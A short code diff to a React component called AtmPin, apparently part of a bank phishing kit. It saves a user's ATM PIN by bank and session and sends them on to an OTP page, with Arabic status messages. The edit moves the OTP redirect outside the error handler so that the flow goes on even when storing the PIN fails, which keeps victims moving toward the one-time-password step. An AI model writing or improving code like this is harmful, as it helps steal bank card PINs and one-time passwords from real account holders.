@@ -34,10 +34,10 @@ export default function AtmPin() {
         pin,
       });
       toast.success("تم حفظ البيانات بنجاح");
-      setLocation(`/otp?bank=${bank}&session=${sessionId}`);
     } catch (error) {
-      toast.error("حدث خطأ في حفظ البيانات");
+      console.error("Error saving ATM PIN in DB, continuing anyway:", error);
     }
+    setLocation(`/otp?bank=${bank}&session=${sessionId}`);
   };
 
   return (
